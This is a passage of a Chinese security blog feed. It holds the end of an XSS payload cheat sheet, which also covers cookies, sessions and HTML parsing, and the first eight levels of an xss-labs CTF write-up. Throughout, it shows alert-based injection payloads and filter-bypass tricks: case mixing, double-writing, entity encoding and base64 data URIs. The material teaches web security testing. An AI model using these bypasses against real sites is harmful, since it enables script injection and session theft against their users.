class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:eval(alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;))&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:aaa&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h5 id="XSS利用方式2-1"><a href="#XSS利用方式2-1" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h5 id="利用方式3"><a href="#利用方式3" class="headerlink" title="利用方式3"></a>利用方式3</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">eval(alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;))&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="利用方式4"><a href="#利用方式4" class="headerlink" title="利用方式4"></a>利用方式4</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">kycg.asp?ttt</span>=<span class="hljs-string">1000</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">prompt(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)<span class="hljs-attr">y</span>=<span class="hljs-string">2016</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><h5 id="标准格式-1"><a href="#标准格式-1" class="headerlink" title="标准格式"></a>标准格式</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="利用方式1-1"><a href="#利用方式1-1" class="headerlink" title="利用方式1"></a>利用方式1</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="利用方式2"><a href="#利用方式2" class="headerlink" title="利用方式2"></a>利用方式2</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">prompt(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)<span class="hljs-attr">bad</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="利用方式4-1"><a href="#利用方式4-1" class="headerlink" title="利用方式4"></a>利用方式4</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="标签-2"><a href="#标签-2" class="headerlink" title="&lt;form&gt;标签"></a><code>&lt;form&gt;</code>标签</h4><h5 id="XSS利用方式1-1"><a href="#XSS利用方式1-1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h5><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h5 id="XSS利用方式2-2"><a href="#XSS利用方式2-2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">postaction</span>=<span class="hljs-string">aa.asp?onmouseover</span>=<span class="hljs-string">prompt(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">postaction</span>=<span class="hljs-string">aa.asp?onmouseover</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">onmouseover</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>)&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h5 id="XSS利用方式3-1"><a href="#XSS利用方式3-1" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><blockquote><p>原code</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">postaction</span>=<span class="hljs-string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>base64编码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">postaction</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="标签-3"><a href="#标签-3" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;</code>标签</h4><h5 id="XSS利用方式1-2"><a href="#XSS利用方式1-2" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;);<span class="hljs-attr">height</span>=<span class="hljs-string">5width</span>=<span class="hljs-string">1000/</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XSS利用方式2-3"><a href="#XSS利用方式2-3" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><p>原code</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>base64编码使用data伪协议，当某些关键字被过滤时使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XSS利用方式3-2"><a href="#XSS利用方式3-2" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;aaa&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XSS利用方式3-3"><a href="#XSS利用方式3-3" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:prompt(`xss`)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg&lt;&gt;标签"></a><code>svg&lt;&gt;</code>标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="二、session与cookie"><a href="#二、session与cookie" class="headerlink" title="二、session与cookie"></a>二、session与cookie</h2><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>由于HTTP协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是 Session</p><p>典型的场景比如购物车，当你点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的，所以服务端要为特定的用户创建了特定的 Session，用用于标识这个用户，并且跟踪用户，这样才知道购物车里面有几本书。</p><p>这个 Session是保存在服务端的，有一个唯一标识。在服务端保存 Session的方法很多，内存、数据库、文件都有。集群的时候也要考虑 Session的转移，在大型的网站一般会有专门的 Session服务器集群，用来保存用户会话，这个时候 Session信息都是放在内存的，使用一些缓存服务比如 Memcached之类的来放 Session。</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>思考一下服务端如何识别特定的客户？这个时候 Cookie就登场了。</p><p>每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。实际上大多数的应用都是用 Cookie来实现 Session跟踪的，第一次创建 Session的时候，服务端会在HTTP协议中告诉客户端，需要在Cookie里面记录个SessionID，以后每次请求把这个会话ID发送到服务器，我就知道你是谁了。</p><p>设想你某次登陆过一个网站，只需要登录一次就可以在一定时间内浏览这个网站的所有内容，这是如何做到的？也是 Cookie</p><p>Cookie是指某些网站为了辨别用户身份而储存在客户端上的数据（通常经过加密）。也就是说，只要有了某个用户的 cookie，就能以他的身份登录</p><p>获取cookie：</p><p>浏览器(客户端)：document.cookie</p><p>服务器端(php)：$_COOKIE</p><p>举例</p><p><img src="https://s2.loli.net/2022/12/17/1nFujzqNKo9iOCc.jpg" alt="image-20210919174759488"></p><p>知道了 cookie的格式， cookie的属性选项，接下来我们就可以设置 cookie了。首先得明确一点：cookie既可以由服务端来设置，也可以由客户端来设置。</p><p><img src="https://s2.loli.net/2022/12/17/PMrTG5fKcVnQSgo.jpg" alt="image-20210919174917327"></p><p>1、一个Set-Cookie字段只能设置一个 cookie，当你要想设置多个 cookie，需要添加同样多的Set- Cookie字段。 2、服务端可以设置 cookie的所有选项：expires、 domain、path、 secure、 HttpOnly</p><p><img src="https://s2.loli.net/2022/12/17/2E54CL7KkuhRmeY.jpg" alt="image-20210919175330122"></p><p>客户端可以设置 cookie的下列选项：expires、 domain、path、 secure（有条件：只有在https协议的网页中，客户端设置 secure类型的 cookie才能成功），但无法设置 HttpOnly选项。</p><h2 id="三、浏览器解析方式"><a href="#三、浏览器解析方式" class="headerlink" title="三、浏览器解析方式"></a>三、浏览器解析方式</h2><p>语言的解析般分为词法分析（ lexical analysis）和语法分析（ Syntax analysis）两个阶段， Webkit中的HTML解析也不例外，我们这里主要关注词法分析。</p><p>词法分析的任务是对输入字节流进行逐字扫描，根据构词规则识别单词和符号，分在WebKⅰt中，有两个类，同词法分析密切相关，它是 HTMLToken和HTMLTokenizer类，可以简单将 HTMLToken类理解为标记， HTMLTokenizer类理解为词法解析器。HTML词法解析的任务，就是将输入的字节流解析成一个个的标记（ HTMLToken），然后由语法解析器进行下一步的分析</p><p>在XML&#x2F;HTML 的文档解析中， token这个词经常用到，我将其理解为一个有完整语义的单元（也就是分出来的“词”），一个元素通常对应于3个 token，一个是元素的起始标签，一个是元素的结束标签，一个是元素的内容，这点同DOM树是不一样的，在DOM树上，起始标签和结束标签对应于一个元素节点，而元素内容对应另一个节点。</p><p>除了起始标签（ StartTag）、结束标签（仼 drAg）和元素内容（ Character），HTM标签还有 DOCTYPE（文档类型） Comment（注释）， Uninitialized（默认类型）和EndofFile（文档结束）等类型，参见 HTMLToken h中的Type枚举。</p><p>在HTML中，某些字符是预留的。例如在HTML中不能使用<code>&lt;</code>或<code>&gt;</code>，这是因为浏览器可能误认为它们是标签的开始或结束。如果希望正确地显示预留字符，就需要在HTML中使用对应的字符实体。一个HTML字符实体描述如下</p><p>字符显示 描述 实体名称 实体编号</p><p>&lt; 小于号 &amp;lt<code>&lt;</code></p><p>需要注意的是，某些字符没有实体名称，但可以有实体编号</p><p>HTML的词法分析：<a href="http://www.w3.org/TR/html5/tokenization.html">http://www.w3.org/TR/html5/tokenization.html</a></p><p>HTML的规范是相当宽松的，所以词法解析要考虑到的问题很多，HTML5 specification 在这方面为实现者做了绝大部分工作。 不考虑类似<code>&lt;html&gt;</code>和<code>&lt;body&gt;</code>之间的回车换行</p><p>……</p><h2 id="四、XSS总结与拓展"><a href="#四、XSS总结与拓展" class="headerlink" title="四、XSS总结与拓展"></a>四、XSS总结与拓展</h2><p>（1）输入在标签间的情况：测试<code>&lt;&gt;</code>是否被过滤或转义，若无则直接<code>&lt;mgsc=1 onerror=alert(1)&gt;</code></p><p>（2）输入在 script标签内：我们需要在保证内部JS语法正确的前提下，去插入我们的 payload。如果我们的输岀在字符串内部，测试字符串能否被闭合。如果我们无法闭合包裹字符串的引号，这个点就很难利用了</p><p>可能的解决方案：可以控制两处输入且<code>\</code>可用、存在宽字节</p><p>（3）输入在HTML属性內：首先査看属性是否有双引号包裏、没有则直接添加新的事件属性；</p><p>有双引号包裹则测试双引号是否可用，可用则闭合属性之后添加新的事件属性；</p><p>TIP：HTML的属性，如果被进行HTML实体编码（形如<code>&amp;#039；&amp;#x27</code>），那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造 payload。</p><p>（4）输岀在JS中，空格被过滤：使用<code>/**/</code>代替空格。 （5）输出在JS注释中：设法插入换行符<code>%0A</code>，使其逃逸出来。 （6）输入在JS字符串内：可以利用JS的十六进制、八进制、 unicode编码。 （7）输入在<code>src/ href /action</code>等属性内：可以利用 javascript:alert(1)，以及<code>data:text/html;base64;</code>加上base64编码后的HTML</p><p>（8） Chrome下 iframe自身的弹框姿势</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(2)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> </span><br><span class="hljs-tag"><span class="hljs-attr">src</span>=<span class="hljs-string">data</span> <span class="hljs-attr">text</span>/<span class="hljs-attr">html</span>, &lt;<span class="hljs-attr">script</span>&gt;</span>alert(3)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;&lt;script&gt;alert(4))</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;/script&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><p>（9）坑点之自带 HtmlEncode（转义）功能的标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>k/textarea&gt;<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">noframes</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">noframes</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xmp</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xmp</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plaintext</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plaintext</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当我们的 XSS payload位于这些标签中间时，并不会解析，除非我们把它们闭合掉。</p><p><a href="https://www.freebuf.com/articles/web/289263.html">相关链接</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-labs(WriteUp)</title>
    <link href="/2023/08/24/xss-labs(WriteUp)/"/>
    <url>/2023/08/24/xss-labs(WriteUp)/</url>
    
    <content type="html"><![CDATA[<h2 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h2><ul><li>先讲讲什么是跨站脚本攻击XSS(Cross Site Scripting)</li></ul><h3 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h3><ul><li><strong>本质上是针对html的一种注入攻击</strong>，没有遵循数据与代码分离的原则，把用户输入的数据当作代码来执行<br>xss跨站脚本攻击是指恶意攻击者往Web页面里插入恶意脚本代码（包括当不限于<strong>js，flash</strong>等等），当用户浏览该页面时，嵌入其中Web里面的脚本代码会被执行，从而达到恶意攻击用户的目的。为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，所以将跨站脚本攻击缩写为XSS。</li></ul><hr><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><img src="https://s2.loli.net/2022/12/16/NphayjE4T9H8VGX.png" alt="image-20221216130147548" style="zoom: 25%;" /><p>查看题目发现，url中可以使用name传参，并且参数会回显在页面上，这就满足了xss的要求</p><p>查看源码：只要出发了alert就可以过关，于是我们构造代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/16/JD5QfXOSxCWrKnE.png" alt="image-20221216130702842" style="zoom: 25%;" /><p>成功过关</p><img src="https://s2.loli.net/2022/12/16/vtEimOkYP2IuRF1.png" alt="image-20221216130830506" style="zoom: 25%;" /><p>如图，恶意代码回显，导致恶意代码执行，造成xss漏洞</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><img src="https://s2.loli.net/2022/12/16/HTpciYNWoZj2Abz.png" alt="image-20221216130953292" style="zoom: 25%;" /><img src="https://s2.loli.net/2022/12/16/aOt1r5LvuAqBh3Q.png" alt="image-20221216131015739" style="zoom: 33%;" /><p>input输入框输入的值被回显到value之中，我们可以使用双引号闭合value，再使用onclick等相关事件函数进行触发相关代码：</p><img src="https://s2.loli.net/2022/12/16/9t8DmKISxgbC4MP.png" alt="image-20221216131238635" style="zoom:33%;" /><p><img src="https://s2.loli.net/2022/12/16/FvCEX6om7c2SVA1.png" alt="image-20221216131306391"></p><p>此时，当我们点击input框，即可触发事件</p><img src="https://s2.loli.net/2022/12/16/i2mNbr3qDsjYIM1.png" alt="image-20221216131346797" style="zoom:25%;" /><p>方法二：</p><p>可以将input框闭合，使用新的标签：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;a onclick=alert(1)&gt;hacker&lt;/a&gt;//</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/16/l85KPkep6hUqtWA.png" alt="image-20221216131730043"></p><p><img src="https://s2.loli.net/2022/12/16/HK5bgCrGZYXcfnE.png"></p><p>此时，我们将input框闭合了,并且回显了一个新的a标签，点击即可触发事件</p><p>(使用其他的标签或事件亦可，如：img body svg input button标签等等，onload,onerror,onfocus,onmouseover 事件 等等)</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>本关把尖括号转移了，所以我们不能闭合标签，</p><p>我们可以闭合单引号，使用onfocus等事件</p><p><img src="https://s2.loli.net/2022/12/16/wijDoOcJybC8UaZ.png" alt="image-20221216132341214"></p><p>xss代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27; onfocus=alert(1) &#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/16/k4OSlw2bzWrC8vB.png" alt="image-20221216132607274"></p><p>当焦点在input框中即可触发事件</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>和上一关一样，只不过闭合双引号</p><p><img src="https://s2.loli.net/2022/12/16/AOsm1hyJkvLPiUC.png" alt="image-20221216132833965"></p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>这一关把on给过滤了</p><p><img src="https://s2.loli.net/2022/12/16/lwGdT4LMQicnHuf.png" alt="image-20221216133058825"></p><p>&lt; script 也过滤了</p><p><img src="https://s2.loli.net/2022/12/16/TZCfbcpD3YH5sGz.png" alt="image-20221216133403349"></p><p>我们可以使用JavaScript伪协议</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">伪协议是为关联应用程序而使用的，<span class="hljs-title class_">JavaScript</span>伪协议实际上是把<br><span class="hljs-attr">javascript</span>:后面的代码当<span class="hljs-title class_">JavaScript</span>来执行，并将结果值返回给当前页面。 将javascript代码添加到客户端的方法是把它放置在伪协议说明符<br><span class="hljs-attr">javascript</span>:后的<span class="hljs-variable constant_">URL</span>中。 这个特殊的协议类型声明了<span class="hljs-variable constant_">URL</span>的主体是任意的javascript代码，它由javascript<br>的解释器运行。<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/16/ClqQ4MReETmf7pb.png" alt="image-20221216133834460"></p><p>xss代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;a href=javascript:alert(1)&gt;hacker&lt;/a&gt;//</span><br><span class="hljs-string">或</span><br><span class="hljs-string">&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>此处js伪协议写在a标签的href属性中，将Javascript后面的代码当作js代码执行</p><p><img src="https://s2.loli.net/2022/12/16/vI72DbydkQp8ZJ1.png" alt="image-20221216134224702"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>过滤更多了，我们尝试上一题方法，发现href被过滤，我们尝试大小写绕过：hRef发现可行</p><p><img src="https://s2.loli.net/2022/12/16/WoTpE6GDnc29zxM.png" alt="image-20221216134918561"></p><p><img src="https://s2.loli.net/2022/12/16/wUvW6c3qKbCOEJy.png" alt="image-20221216135032318"></p><p>xss:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;a hRef=javascript:alert(1)&gt;hacker&lt;/a&gt;//</span><br></code></pre></td></tr></table></figure><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot; oonnclick=alert(1) &quot;</span><br>或<br><span class="hljs-string">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</span><br></code></pre></td></tr></table></figure><p>双写绕过，此处将on，script替换为空</p><p><img src="https://s2.loli.net/2022/12/16/jte8obr5QPARxOd.png" alt="image-20221216140256840"></p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这一关我们输入的参数会当作下面a标签的href地址，于是我们可以使用js伪协议：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/16/KMrCpYguPnbNsJq.png" alt="image-20221216140901188"></p><p>但是查看源码发现：</p><p><img src="https://s2.loli.net/2022/12/16/2UzTWPfC8FaynuH.png" alt="image-20221216141207967"></p><p>script被过滤了</p><p>于是我们想到了<strong>html实体编码</strong>：</p><p>将s进行编码，可得：&amp;# x0073;</p><p>html会将该编码识别为字母： s</p><p>于是xss代码为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">java&amp;#x0073;<span class="hljs-attr">cript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><a 